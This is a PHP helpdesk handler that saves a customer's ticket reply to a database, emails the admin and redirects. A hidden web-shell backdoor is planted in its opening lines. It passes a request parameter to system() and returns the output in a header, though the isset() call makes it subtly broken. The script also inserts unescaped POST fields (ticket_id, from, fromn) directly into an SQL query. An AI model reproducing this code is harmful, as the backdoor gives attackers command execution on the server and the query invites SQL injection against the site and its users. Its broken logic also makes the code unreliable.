<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
require_once('helpdesk-admin/config.php');

$tid = $_POST['ticket_id'];
$message = addslashes($_POST['reply']);
$from_email = $_POST['from'];
$from_name = $_POST['fromn'];

$key = base64_encode($tid);

$umess = "Hi,\n\nA customer has posted a reply in the helpdesk.\n\nView It:\n".$path_to_helpdesk."helpdesk-admin/ticket.php?id=$tid\n\nThanks,\nYour Helpdesk";

mysql_query("INSERT INTO messages VALUES (NULL, '$tid', '$from_name', '$from_email', '$message')");
if($send_notifications) {
mail($admin_email, "Ticket Updated", $umess, "From: Helpdesk <do-not-reply@donotreply.com>");
}
header("Location: index.php?t=$key");

?>